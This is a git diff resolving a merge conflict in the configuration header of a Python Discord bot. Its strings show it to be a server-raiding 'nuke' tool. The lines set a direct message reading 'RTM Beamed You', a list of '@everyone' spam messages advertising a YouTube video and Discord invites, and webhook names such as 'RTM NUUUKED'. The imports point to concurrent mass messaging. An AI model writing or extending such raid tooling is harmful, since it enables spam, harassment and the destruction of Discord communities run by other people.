@@ -1,11 +1,7 @@
 # Bot Start Point
 
 dm_msg = "**RTM Beamed You** https://youtu.be/gGzOhy9vNkg\nhttps://discord.gg/hJZBtGwjkq"
-<<<<<<< HEAD
 spam_messages = ["@everyone **RTM wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by RTM | **https://discord.gg/hJZBtGwjkq"]
-=======
-spam_messages = ["@everyone **RTM wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by RTM | **https://discord.gg/pE2f8KaK3R"]
->>>>>>> 5f5e5aa9868ca10d1c99ff1c17690cf3774f9022
 webhook_usernames = ["RTM Wizzed U", "RTM", "RTM BEAMER", "🤫", "RTM NUUUKED"]
 
 import discord, random, aiohttp, asyncio, json, os, threading
